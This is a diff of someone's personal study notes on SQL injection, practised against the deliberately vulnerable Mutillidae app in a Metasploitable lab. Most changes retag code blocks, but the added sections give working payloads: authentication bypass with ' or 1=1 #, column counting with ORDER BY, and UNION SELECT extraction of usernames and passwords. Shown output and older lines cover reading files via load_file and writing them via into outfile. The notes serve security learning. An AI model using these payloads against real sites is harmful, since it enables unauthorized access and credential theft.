@@ -420,28 +420,28 @@ select * from accounts where user = "admin" and password = "adminpass";
 - AND is asking "is this condition also true?"
 
 What SQL injection would look like
-```sh
+```sql
 select * from accounts where user = "adminSQL" and password = "adminpass" and 1 = 1;
 ```
 
 If the database is very large you might have issues with `SELECT *` so you can narrow it down in these situations.
-```sh
+```sql
 select username,password from accounts;
 ```
 
 Using `ORDER BY`
-```sh
+```sql
 select * from accounts order by cid;
 ```
 - You can modify the table view by using either `asc` or `desc` after `cid`.
 - You can order by anything else such as username.
 
-```sh
+```sql
 select username,password from accounts order by username;
 ```
 
 How a hacker uses order by to determine the amount of entries
-```sh
+```sql
 select * from accounts where username = "admin" and password = "adminpass" order by 1;
 ```
 - We know that the database on metasploitable currently has 16 rows in accounts so this command would work, but if you tried using 17 or more it would return an error.
@@ -501,28 +501,28 @@ You can remove the last part of the URL leaving just the website name, then clic
 
 Check the Metasploit server to see if MySQL has saved the user:
 
-```sh
+```sql
 mysql -u root
 ```
 
-```sh
+```sql
 show databases;
 ```
 
-```sh
+```sql
 use owasp10;
 ```
 
-```sh
+```sql
 show tables;
 ```
 
-```sh
+```sql
 select * from accounts;
 ```
 
 How to delete the account if you want to:
-```sh
+```sql
 delete from accounts where username = "user";
 ```
 - You can use the `cid` if you want to.
@@ -542,7 +542,7 @@ You should try this single quote in all of the fields to see if any of them are 
 If the website returns an error then it's vulnerable to SQL injection. It does this because in the database it breaks the SQL command. Most modern websites will not reveal any error information but you can use a sleep command, for example, to see if the webpage hangs (freezes) 
 
 Simple SQL payload attacking the password field:
-```sh
+```sql
 <user-password>' and 1=1#
 ```
 - This tells you if the website allows you to use SQL or not.
@@ -557,7 +557,7 @@ http://10.0.3.5/mutillidae/index.php?page=user-info.php&username=bill&password=P
 ```
 
 To find out if you can use SQL we can add something to the URL to check, for example after the username add:
-```sh
+```sql
 ' order by 1 %23
 ```
 - %23 - URL encoded version of #
@@ -570,53 +570,123 @@ http://10.0.3.5/mutillidae/index.php?page=user-info.php&username=bill' order by 
 ```
 - Shows if you can use SQL injection or not
 
-Taking a break here because i can't get the sql to work and it looks like it's using the wrong database even though i updated it in the `config.inc`
+Taking a break here because i can't get the sql to work and it looks like it's using the wrong database even though i updated it in the `config.inc`. After restarting the servers it seems as if it's working now. This time i'm not logged in. I was in the wrong area which is why this didn't work the first time.
+
+**User Info**
+
+ Continuing from Owasp top 10 >  A1 - Injection > SQL - Extra Data > User Info
+
+I get the admin details with:
+username: admin
+password: adminpass
+
+I add a `\` in the username field which throws an error and provides the logic of the database:
+```sql
+SELECT * FROM accounts WHERE username='\' AND password=''
+```
+
+Retrieving all of the accounts details:
+```sql
+' or 1=1 #
+```
+
+What this would look like:
+```sql
+SELECT * FROM accounts WHERE username='' or 1=1 # AND password=''
+```
+
+**Bypass Authentication**
+
+**Make sure you're in the correct area, as follows:**
+Owasp top 10 >  A1 - Injection > SQL > Bypass Authentication > Login
+
+Again, i can use the backslash character `\` to find out the logic. Here i can use the same payload to login as the admin account.
+
+```sql
+' or 1=1 #
+```
+
+In this section i get `order by` to work correctly. It throws an error at 6.
+
+Payload:
+```sh
+http://10.0.3.5/mutillidae/index.php?page=user-info.php&username=admin%27%20order%20by%206%23&password=adminpass&user-info-php-submit-button=View+Account+Details
+```
+- %20 - URL encoded space character
+
+Error results:
+```sql
+SELECT * FROM accounts WHERE username='admin' order by 6#' AND password='adminpass'
+```
 
 **Terminology:**
 A table is a collection of rows having one or more columns. A row is a value of a row type. Every row of the same table has the same row type. **The value of the i-th field of every row in a table is the value of the i-th column of that row in the table**. The row is the smallest unit of data that can be inserted into a table and deleted from a table.
 
 I'll add a screenshot here of the table from the Metasploitable server, when i get on it, because it might be easier to see what is happening and what is meant by the different terminology. 
 
+![](img/sql-tables-and-columns.png)
+
 Using union select instead of order
-```sh
+```sql
 ' union select 1,2,3,4,5 %23
 ```
 
 We can use the results to modify the request and gain additional information
-```sh
+```sql
 ' union select 1,database(),user(),version(),5 %23
 ```
 - %20 - URL encoded version of a space in the URL field
 
-Retrieving table names
+Payload:
 ```sh
+http://10.0.3.5/mutillidae/index.php?page=user-info.php&username=admin%27%20%20union%20select%201,database(),user(),version(),5%23&password=adminpass&user-info-php-submit-button=View+Account+Details
+```
+
+Output:
+```sh
+Username=admin  
+Password=adminpass  
+Signature=Monkey!  
+
+Username=owasp10  
+Password=root@localhost  
+Signature=5.0.51a-3ubuntu5
+```
+
+Retrieving table names
+```sql
 ' union select 1,table_name,null,null,5 from information_schema.tables
 ```
 
 Retrieving a specific table
-```sh
+```sql
 ' union select 1,table_name,null,null,5 from information_schema.tables where table_schema = "owasp10"
 ```
 - Using the result from the database command `database()` which in this case was owasp10.
 
 Select specific column names
-```sh
+```sql
 ' union select 1,column_name,null,null,5 from information_schema.columns where table_name = "accounts"
 ```
 
 Retrieve the sensitive data 
-```sh
+```sql
 ' union select 1, username,password,is_admin,5 from accounts
 ```
 - I've left the URL comment `%23` out of the last few payloads so make sure to leave it in the URL while going through these steps.
 
-How to read files
+Payload:
 ```sh
+http://10.0.3.5/mutillidae/index.php?page=user-info.php&username=admin%27%20%20union%20select%201,username,password,is_admin,5%20from%20accounts%23&password=adminpass&user-info-php-submit-button=View+Account+Details
+```
+
+How to read files
+```sql
 ' union select null,load_file("/ect/passwd"),null,null,null
 ```
 
 How to writes files
-```sh
+```sql
 ' union select null, "some text", null,null,null into outfile "/tmp/some-text-file.txt"
 ```
 - Usually it doesn't allow you to write files but it's worth checking.
